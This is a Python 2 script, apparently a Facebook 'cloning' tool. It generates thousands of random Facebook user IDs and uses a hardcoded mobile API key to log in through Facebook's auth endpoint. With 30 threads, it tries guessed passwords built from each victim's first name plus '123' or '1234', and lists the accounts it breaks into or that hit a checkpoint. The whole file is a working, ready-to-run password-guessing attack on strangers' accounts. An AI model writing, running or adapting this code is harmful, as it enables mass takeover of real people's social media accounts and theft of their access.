#!/usr/bin/python2
#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
reload(sys)
os.system('rm -rf Omi.txt')

for n in range(5000):

    nmbr = random.randint(100000100000000, 100009999999999)

    sys.stdout = open("Omi.txt", "a")

    print(nmbr)

    sys.stdout.flush()
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 Auto.py')

from requests.exceptions import ConnectionError
from mechanize import Browser

#### browser ####
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#### colours ####
B='\033[1;94m'
Y='\033[1;93m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'

#### exit ####
def exb():
	print (R + 'Exit')
	os.sys.exit()

#### clear ####
def cb():
    os.system('clear')

#### time sleep ####
def t():
    time.sleep(2)
def t1():
    time.sleep(0.03)

#### print std ####
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

#### token remove ####
def trb():
    os.system('rm -rf token.txt')

##### LOGO #####
logo = """
\033[1;92m  _____ _   _         _   _        _      _   
\033[1;92m |_   _| |_| |_  __ _| |_| |_ __ _| |__  /_\  
\033[1;92m   | | | / / ' \/ _` |  _|  _/ _` | / / / _ \ 
\033[1;92m   |_| |_\_\_||_\__,_|\__|\__\__,_|_\_\/_/ \_\
\033[1;97m«-------------------\033[1;92m<>\033[1;97m------------------»"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;92mPlease Wait \x1b[1;92m"+o),;sys.stdout.flush();time.sleep(0.5)

back=0
successfull=[]
checkpoint=[]
oks=[]
cps=[]
id=[]

os.system("clear")
print  """
\033[1;92m  _____ _   _         _   _        _      _   
\033[1;92m |_   _| |_| |_  __ _| |_| |_ __ _| |__  /_\  
\033[1;92m   | | | / / ' \/ _` |  _|  _/ _` | / / / _ \ 
\033[1;92m   |_| |_\_\_||_\__,_|\__|\__\__,_|_\_\/_/ \_\
\033[1;97m«-------------------\033[1;92m<>\033[1;97m------------------»"""

CorrectUsername = "TkhattakA"
CorrectPassword = "TkhattakA"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m-->\033[1;93mTool Username:\x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m-->\033[1;93mTool Password:\x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
    else:
        print "\033[1;91mWrong Username"

#### login ####
def login():
	cb()
	try:
		tb=open('token.txt', 'r')
		menu() 
	except (KeyError,IOError):
		cb()
		print (logo)
		print('         \033[1;97m【\x1b[1;97mLOGIN WITH FACEBOOK\x1b[1;97m】\n' )
		id = raw_input('\033[1;97m--\033[1;92m Username: \x1b[1;97m')
		pwd = raw_input('\033[1;97m--\033[1;92m Password: \x1b[1;97m')
		tik()
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		z=json.load(data)
		if 'access_token' in z:
		    st = open("token.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print '\n\x1b[1;92mLogin Successful...'
		    os.system('xdg-open https://www.youtube.com/channel/UCH-ghX0oPegv_qYrSr2wFWg')
		    menu()
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print("\n\x1b[1;91mYour Account is on Checkpoint")
		        t()
		        login()
		    else:
		        print("\n\x1b[1;91mPassword/Email is wrong")
		        trb()
		        t()
		        login()
def menu():
	cb()
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		trb()
		t()
		login()
	try:
		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)
		a=json.loads(otw.text)
	except KeyError:
		print("\n\x1b[1;91mYour Account is on Checkpoint")
		trb()
		t()
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;91mThere is no internet connection"
		t()
		exb()
	cb()
	print (logo)
	print "\033[1;97m--\033[1;92m1.\x1b[1;92mStart Cloning..."
	print "\033[1;97m--\033[1;91m0.\033[1;91mExit            "
	mb()


def mb():
	bm = raw_input("\n\033[1;97mChoose an Option: \033[1;97m")
	if bm =='':
		print "\x1b[1;91mFill in correctly"
		mb()
	elif bm =='1':
		pak()
	elif bm =='0':
	    exb()
	else:
		print "\x1b[1;91mFill in correctly"
		mb()


def pak():
	global tb
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		trb()
		t()
		login()
	cb()
	print (logo)
	print "\033[1;97m--\033[1;92m1.\x1b[1;92mStart..."
	print "\033[1;97m--\033[1;91m0.\033[1;91mBack"
	pb()

def pb():
	bp = raw_input("\n\033[1;97mChoose an Option: \033[1;97m")
	if bp =='':
		print "\x1b[1;91mFill in correctly"
		pb()
	elif bp =='1':
		cb()
		print (logo)
		try:
			idlist=('Omi.txt')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print (R + ' Error! please Start Again ')
			os.system('python2 Auto.py')
	elif bp =='0':
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pb()
	print "\033[1;97m«--------\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m--------»"
	print "\033[1;97m«-----------------------\033[1;92m<>\033[1;97m-----------------------»"
	def main(arg):
		global cps, oks
		user=arg
		try:
			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
			j=json.loads(h.text)
			ps1=(j['first_name']+'123')
			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			k=json.load(dt)
			if 'www.facebook.com' in k['error_msg']:
			    print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + ps1
			    cps.append(user+ps1)
			else:
			    if 'access_token' in k:
			        print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + ps1
			        oks.append(user+ps1)
			    else:
				 h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
			         j=json.loads(h.text)
			         ps2=(j['first_name']+'1234')
			         dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			         k=json.load(dt)
			         if 'www.facebook.com' in k['error_msg']:
			             print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + ps2
			             cps.append(user+ps2)
			         
		except:
			pass
	p=ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m«-----------------------\033[1;92m<>\033[1;97m-----------------------»"
	print(S+'Process has been completed')
	print(S+'Total '+Y+'OK'+S+'/'+R+'CP'+S+' = '+Y+str(len(oks))+S+'/'+R+str(len(cps)))
	raw_input("\n\033[1;91mPress Enter to go Back")
	menu()
if __name__=='__main__':
    login()
